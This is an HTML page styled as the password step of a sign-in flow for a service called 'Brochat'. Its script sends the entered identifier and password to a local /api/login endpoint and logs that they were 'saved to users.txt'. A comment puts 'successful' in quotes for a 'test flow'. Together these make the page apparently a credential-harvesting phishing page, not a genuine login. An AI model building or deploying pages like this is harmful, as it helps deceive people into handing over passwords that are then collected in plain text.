<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Enter Password</title>
<style>
  *{box-sizing:border-box}
  html,body{margin:0;padding:0}
  body{
    font-family:"Inter","Helvetica Neue",Helvetica,Arial,sans-serif;
    background:#f7f8fa;color:#2f353b;min-height:100vh;font-weight:400;
    display:flex;flex-direction:column;
  }
  .top{
    background:#f7f8fa;padding:60px 16px 0;
    display:flex;flex-direction:column;align-items:center;
  }
  .card{
    background:#fff;width:100%;max-width:445px;border-radius:6px;border:1px solid #e6e8eb;
    padding:30px 30px 30px;text-align:center;
  }
  .logo{width:76px;height:76px;margin:0 auto 4px;display:block}
  h1{
    font-family:"Avenir Next","Avenir","Graphik","Inter","Helvetica Neue",Arial,sans-serif;
    font-size:30px;font-weight:700;color:#16191d;margin:30px 0 26px;letter-spacing:-.3px;
  }
  .who{
    display:inline-flex;align-items:center;gap:12px;border:1px solid #e6e8eb;border-radius:10px;
    padding:14px 20px;font-size:17px;font-weight:600;color:#16191d;margin-bottom:38px;
  }
  .who a{color:#0fadff;text-decoration:none;font-weight:600;font-size:16px}
  label{display:block;text-align:left;font-size:14px;font-weight:500;color:#5b6168;margin-bottom:8px}
  .wrap{position:relative}
  .field{
    width:100%;height:60px;border:2px solid transparent;border-radius:10px;background:#f5f5f6;
    padding:0 56px 0 16px;font-size:18px;font-family:inherit;outline:none;color:#16191d;
  }
  .field:focus{border-color:#16191d;background:#fff}
  .eye{
    position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:0;
    cursor:pointer;padding:6px;display:flex;
  }
  .err{color:#d6293e;font-size:14px;text-align:left;margin-top:8px;min-height:18px}
  .link{
    display:inline-block;margin-top:14px;color:#0fadff;font-weight:600;font-size:17px;
    text-decoration:none;background:none;border:0;cursor:pointer;font-family:inherit;
  }
  .next{
    display:block;margin:24px auto 0;background:#0fadff;color:#fff;border:0;
    border-radius:999px;height:50px;padding:0 31px;font-size:17px;font-weight:500;
    cursor:pointer;font-family:inherit;
  }
  .next:hover{background:#0a9ee8}
  footer{background:#f7f8fa;padding:50px 16px 50px;margin-top:auto}
  .cols{
    max-width:1100px;margin:0 auto;display:grid;
    grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:28px;
  }
  .cols h4{margin:0 0 12px;font-weight:400;font-size:18px;color:#16191d}
  .cols a{display:block;color:#3d4249;font-weight:400;text-decoration:none;font-size:18px;margin-bottom:8px}
  .cols a:hover{text-decoration:underline}
  @media (max-width:480px){h1{font-size:26px}.card{padding:24px 20px 28px}}
</style>
</head>
<body>
  <div class="top">
    <main class="card">
      <!-- Brochat mark -->
      <svg class="logo" viewBox="0 0 100 100" fill="none" stroke="#16191d" stroke-width="3.5" stroke-linejoin="round" stroke-linecap="round" aria-label="Brochat">
        <path d="M50 10C27 10 12 25 12 44c0 10 4 18 11 24-1 6-4 11-9 15 9 1 17-2 23-6 4 1 8 2 13 2 23 0 38-15 38-35S73 10 50 10Z"/>
        <path d="M40 30v28m0-28h11a7 7 0 0 1 0 14H40m0 0h13a7 7 0 0 1 0 14H40" stroke-width="4.5"/>
      </svg>

      <h1>Enter Password</h1>

      <div class="who">
        <span id="maskedId">your account</span>
        <a href="brochat-login.html">Not you?</a>
      </div>

      <form id="pwForm" novalidate>
        <label for="password">Password</label>
        <div class="wrap">
          <input class="field" id="password" name="password" type="password" autocomplete="current-password" autofocus>
          <button type="button" class="eye" id="eye" aria-label="Show password">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="#a9adb3" aria-hidden="true">
              <path d="M12 5C6.5 5 2.4 8.6 1 12c1.4 3.4 5.5 7 11 7s9.6-3.6 11-7c-1.4-3.4-5.5-7-11-7Zm0 11.5a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9Zm0-7a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5Z"/>
            </svg>
          </button>
        </div>
        <div class="err" id="err" role="alert"></div>
        <a class="link" href="#forgot">Forgot Password</a>
        <button type="submit" class="next">Next</button>
      </form>
    </main>
  </div>

  <footer>
    <div class="cols">
      <div><h4>Company</h4><a href="#">About Brochat</a><a href="#">Careers</a><a href="#">News</a></div>
      <div><h4>Community</h4><a href="#">Support</a><a href="#">Community Guidelines</a><a href="#">Safety Center</a></div>
      <div><h4>Advertising</h4><a href="#">Buy Ads</a><a href="#">Advertising Policies</a><a href="#">Brand Guidelines</a></div>
      <div><h4>Legal</h4><a href="#">Privacy Center</a><a href="#">Your Privacy Choices</a><a href="#">Cookie Policy</a><a href="#">Report Infringement</a><a href="#">Terms of Service</a></div>
    </div>
  </footer>

<script>
  // Show the identifier from the login page, masked like "vik***com".
  function mask(v) {
    if (!v) return 'your account';
    if (v.length <= 6) return v.charAt(0) + '***';
    return v.slice(0, 3) + '***' + v.slice(-3);
  }
  try {
    var id = sessionStorage.getItem('brochat_identifier');
    document.getElementById('maskedId').textContent = mask(id);
  } catch (e) {}

  var pw = document.getElementById('password');
  var eye = document.getElementById('eye');
  var err = document.getElementById('err');

  eye.addEventListener('click', function () {
    var show = pw.type === 'password';
    pw.type = show ? 'text' : 'password';
    eye.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
    pw.focus();
  });

  document.getElementById('pwForm').addEventListener('submit', function (e) {
    e.preventDefault();
    if (!pw.value) { err.textContent = 'Please enter your password.'; return; }
    err.textContent = '';

    fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ identifier: id, password: pw.value })
    })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (data.ok) {
          console.log('Saved to users.txt on the server');
          // TODO: redirect somewhere once login is "successful" in your test flow.
        } else {
          err.textContent = data.error || 'Something went wrong.';
        }
      })
      .catch(function () {
        err.textContent = 'Could not reach the server. Is server.js running?';
      });
  });
</script>
</body>
</html>
